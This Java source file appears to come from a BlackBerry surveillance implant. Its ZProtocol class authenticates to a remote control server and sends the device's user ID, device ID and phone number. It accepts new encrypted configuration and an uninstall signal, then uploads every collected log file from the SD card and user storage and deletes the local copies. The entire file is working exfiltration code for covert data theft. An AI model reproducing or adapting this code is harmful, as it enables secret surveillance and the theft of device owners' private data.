//#preprocess
package blackberry.action.sync.protocol;

import java.util.Vector;

import net.rim.device.api.crypto.RandomSource;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.ByteVector;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.action.sync.Protocol;
import blackberry.action.sync.transport.TransportException;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.log.LogCollector;
import blackberry.transfer.CommandException;
import blackberry.transfer.Proto;
import blackberry.transfer.ProtocolException;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class ZProtocol extends Protocol {

    //#ifdef DEBUG
    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
    //#endif

    private final Encryption cryptoK = new Encryption();
    private final Encryption cryptoConf = new Encryption();

    byte[] Kd = new byte[16];
    byte[] Nonce = new byte[16];

    public boolean start() {

        reload = false;
        uninstall = false;

        cryptoConf.makeKey(Keys.getInstance().getChallengeKey());
        RandomSource.getBytes(Kd);
        RandomSource.getBytes(Nonce);

        //#ifdef DEBUG
        debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
        debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce));
        //#endif

        try {
            //#ifdef DEBUG
            debug.info("***** Authentication *****");
            //#endif          

            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
            byte[] response = transport.command(cypherOut);
            parseAuthentication(response);

            //#ifdef DEBUG
            debug.info("***** Identification *****");
            //#endif  
            response = command(Proto.ID, forgeIdentification());
            parseIdentification(response);

            //#ifdef DEBUG
            debug.info("***** NewConf *****");
            //#endif  
            response = command(Proto.NEW_CONF, forgeNewConf());
            parseNewConf(response);

            //#ifdef DEBUG
            debug.info("***** Download *****");
            //#endif  
            //response = cypherCommand(Proto.DOWNLOAD, forgeDownload());
            //parseDownload(response);

            //#ifdef DEBUG
            debug.info("***** Upload *****");
            //#endif  
            //response = cypherCommand(Proto.UPLOAD, forgeUpload());
            //parseUpload(response);

            //#ifdef DEBUG
            debug.info("***** FileSystem *****");
            //#endif  
            //response = cypherCommand(Proto.FILESYSTEM, forgeFileSystem());
            //parseFileSystem(response);

            //#ifdef DEBUG
            debug.info("***** Log *****");
            //#endif  

            forgeLogs(Path.SD());
            forgeLogs(Path.USER());

            //#ifdef DEBUG
            debug.info("***** End *****");
            //#endif  
            response = command(Proto.LOG_END, forgeEnd());
            parseEnd(response);

            return true;

        } catch (TransportException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        } catch (ProtocolException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        } catch (CommandException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }
    }

    ////************************** PROTOCOL *************************************** ////

    private byte[] forgeAuthentication() {
        Keys keys = Keys.getInstance();

        byte[] data = new byte[104];
        DataBuffer dataBuffer = new DataBuffer(data, 0, data.length, false);

        // filling structure
        dataBuffer.write(Kd);
        dataBuffer.write(Nonce);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == 32,
                "forgeAuthentication, wrong array size");
        //#endif

        dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
        dataBuffer.write(keys.getInstanceId());
        dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == 84,
                "forgeAuthentication, wrong array size");
        //#endif

        // calculating digest       
        final SHA1Digest digest = new SHA1Digest();
        digest.update(Utils.padByteArray(keys.getBuildId(), 16));
        digest.update(keys.getInstanceId());
        digest.update(Utils.padByteArray(Device.getSubtype(), 16));
        digest.update(keys.getConfKey());

        byte[] sha1 = digest.getDigest();

        //#ifdef DEBUG
        debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
        debug.trace("forgeAuthentication confKey="
                + Utils.byteArrayToHex(keys.getConfKey()));
        //#endif

        // appending digest
        dataBuffer.write(sha1);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == data.length,
                "forgeAuthentication, wrong array size");
        //#endif

        //#ifdef DEBUG
        debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data));
        //#endif

        return data;
    }

    private void parseAuthentication(byte[] authResult)
            throws ProtocolException {
        //#ifdef DBC
        Check.ensures(authResult.length == 48, "authResult.length="
                + authResult.length);
        //#endif

        //#ifdef DEBUG
        debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
        //#endif

        // Retrieve K
        byte[] cypherKs = new byte[16];
        Utils.copy(cypherKs, authResult, cypherKs.length);
        byte[] Ks = cryptoConf.decryptData(cypherKs);

        //#ifdef DEBUG
        debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
        debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
        //#endif

        final SHA1Digest digest = new SHA1Digest();
        digest.update(Ks);
        digest.update(Kd);
        digest.update(Keys.getInstance().getConfKey());

        byte[] K = new byte[16];
        Utils.copy(K, digest.getDigest(), K.length);

        cryptoK.makeKey(K);

        //#ifdef DEBUG
        debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
        //#endif

        // Retrieve Nonce and Cap
        byte[] cypherNonceCap = new byte[32];
        Utils.copy(cypherNonceCap, 0, authResult, 16, cypherNonceCap.length);

        byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
        //#ifdef DEBUG
        debug.trace("decodeAuth plainNonceCap="
                + Utils.byteArrayToHex(plainNonceCap));
        //#endif

        boolean nonceOK = Utils
                .equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
        //#ifdef DEBUG
        debug.trace("decodeAuth nonceOK: " + nonceOK);
        //#endif
        if (nonceOK) {
            int cap = Utils.byteArrayToInt(plainNonceCap, 16);
            if (cap == Proto.OK) {
                //#ifdef DEBUG
                debug.trace("decodeAuth Proto OK");
                //#endif
            } else if (cap == Proto.UNINSTALL) {
                //#ifdef DEBUG
                debug.trace("decodeAuth Proto Uninstall");
                //#endif
            } else {
                //#ifdef DEBUG
                debug.trace("decodeAuth error: " + cap);
                //#endif
                throw new ProtocolException();
            }
        } else {
            throw new ProtocolException();
        }

    }

    private byte[] forgeIdentification() {
        final Device device = Device.getInstance();
        device.refreshData();

        byte[] userid = WChar.pascalize(device.getWUserId());
        byte[] deviceid = WChar.pascalize(device.getWDeviceId());
        byte[] phone = WChar.pascalize(device.getWPhoneNumber());

        int len = 4 + userid.length + deviceid.length + phone.length;

        byte[] content = new byte[len];

        DataBuffer dataBuffer = new DataBuffer(content, 0, content.length,
                false);
        //dataBuffer.writeInt(Proto.ID);
        dataBuffer.write(Device.getVersion());
        dataBuffer.write(userid);
        dataBuffer.write(deviceid);
        dataBuffer.write(phone);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == content.length,
                "forgeIdentification pos: " + dataBuffer.getPosition());
        //#endif

        //#ifdef DEBUG
        debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content));
        //#endif
        return content;
    }

    private void parseIdentification(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    private byte[] forgeNewConf() {
        return null;
    }

    private void parseNewConf(byte[] result) throws ProtocolException,
            CommandException {
        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.info("got NewConf");
            //#endif

            byte[] plainConf = cryptoConf.decryptData(result, 4);
            boolean ret = Protocol.saveNewConf(plainConf);
            if (ret) {
                reload = true;
            }

        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.info("no new conf: ");
            //#endif
        } else {
            //#ifdef DEBUG
            debug.error("parseNewConf: " + res);
            //#endif
            throw new ProtocolException();
        }
    }

    private byte[] forgeDownload() {        
        return null;
    }

    private void parseDownload(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    private byte[] forgeUpload() {
        return null;
    }

    private void parseUpload(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    private byte[] forgeFileSystem() {
        return null;
    }

    private void parseFileSystem(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    private void forgeLogs(String basePath) throws TransportException, ProtocolException {
        //#ifdef DEBUG
        debug.info("sending logs from: " + basePath);
        //#endif

        LogCollector logCollector = LogCollector.getInstance();

        final Vector dirs = logCollector.scanForDirLogs(basePath);
        final int dsize = dirs.size();
        for (int i = 0; i < dsize; ++i) {
            final String dir = (String) dirs.elementAt(i);
            final Vector logs = logCollector.scanForLogs(basePath, dir);
            final int lsize = logs.size();
            for (int j = 0; j < lsize; ++j) {
                final String logName = (String) logs.elementAt(j);
                final String fullLogName = basePath + dir + logName;
                final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                if (!file.exists()) {
                    //#ifdef DEBUG
                    debug.error("File doesn't exist: " + fullLogName);
                    //#endif
                    continue;
                }
                final byte[] content = file.read();
                //#ifdef DEBUG
                debug.info("Sending file: " + LogCollector.decryptName(logName)
                        + " = " + fullLogName);
                //#endif

                byte[] response = command(Proto.LOG, content);
                parseLog(response);
              
                logCollector.remove(fullLogName);
            }
            if (!Path.removeDirectory(basePath + dir)) {
                //#ifdef DEBUG
                debug.warn("Not empty directory");
                //#endif
            }
        }
    }

    private void parseLog(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    private byte[] forgeEnd() {
        return Utils.intToByteArray(Proto.LOG_END);
    }

    private void parseEnd(byte[] content) throws ProtocolException {
        checkOk(content);
    }

    //// ************************************************************************ ////
    private byte[] command(int command, byte[] data)
            throws TransportException {
        //#ifdef DBC
        Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
        //#endif

        int dataLen = 0;
        if (data != null) {
            dataLen = data.length;
        }

        byte[] plainOut = new byte[dataLen + 4];
        Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);

        if (data != null) {
            Utils.copy(plainOut, 4, data, 0, data.length);
        }

        byte[] cypherOut = cryptoK.encryptData(plainOut);
        byte[] cypherIn = transport.command(cypherOut);
        byte[] plainIn = cryptoK.decryptData(cypherIn);
        return plainIn;
    }

    private void checkOk(byte[] result) throws ProtocolException {
        int res = Utils.byteArrayToInt(result, 0);
        if (res != Proto.OK) {
            //#ifdef DEBUG
            debug.error("checkOk: " + res);
            //#endif

            throw new ProtocolException();
        }
    }

}
